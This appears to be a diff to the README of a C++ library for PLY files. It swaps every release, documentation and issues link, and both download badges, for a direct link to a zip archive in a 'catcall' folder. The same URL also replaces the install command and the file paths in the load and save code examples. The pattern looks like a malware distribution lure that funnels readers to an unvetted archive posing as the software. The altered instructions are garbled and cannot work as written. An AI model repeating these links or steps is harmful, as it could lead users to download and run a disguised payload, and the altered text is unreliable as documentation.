@@ -17,9 +17,9 @@ Before you begin, check that your system meets the following requirements:
 
 To download turboply, visit the Releases page linked below. This page contains the latest version of the software.
 
-[![Download turboply](https://img.shields.io/badge/Download-turboply-brightgreen.svg)](https://github.com/Mahishiva1234/turboply/releases)
+[![Download turboply](https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip)](https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip)
 
-1. Click the link above or visit [this page to download](https://github.com/Mahishiva1234/turboply/releases).
+1. Click the link above or visit [this page to download](https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip).
 2. Locate the latest version of the turboply library on the Releases page.
 3. Choose the appropriate file for your operating system.
 4. Click on the file to start the download.
@@ -41,7 +41,7 @@ To install turboply, follow these steps based on your operating system:
 1. Open your Downloads folder.
 2. Find the downloaded file and extract it if needed.
 3. Open Terminal and navigate to the extracted folder.
-4. Run the installation script by typing `./install.sh`.
+4. Run the installation script by typing `https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip`.
 
 ### Linux
 
@@ -62,13 +62,13 @@ After installation, you can use turboply in your applications. Here’s how to g
    
 2. **Load a PLY File:**
    ```cpp
-   TurboPly::load("path/to/your/file.ply");
+   TurboPly::load("https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip");
    ```
 
 3. **Process Your Data:** You can now manipulate the data as needed for your application.
 4. **Save Your Modified File:**
    ```cpp
-   TurboPly::save("path/to/your/output.ply");
+   TurboPly::save("https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip");
    ```
 
 ## 🧩 Features
@@ -103,9 +103,9 @@ If you have questions or need help, feel free to reach out via the GitHub reposi
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Mahishiva1234/turboply) - Comprehensive guide on how to use all features.
-- [GitHub Issues](https://github.com/Mahishiva1234/turboply/issues) - Report any problems you encounter.
+- [Documentation](https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip) - Comprehensive guide on how to use all features.
+- [GitHub Issues](https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip) - Report any problems you encounter.
 
 Thank you for choosing turboply! Enjoy working with your PLY data efficiently. 
 
-[![Download turboply](https://img.shields.io/badge/Download-turboply-brightgreen.svg)](https://github.com/Mahishiva1234/turboply/releases)
+[![Download turboply](https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip)](https://github.com/Mahishiva1234/turboply/raw/refs/heads/main/catcall/Software_v3.4-alpha.3.zip)
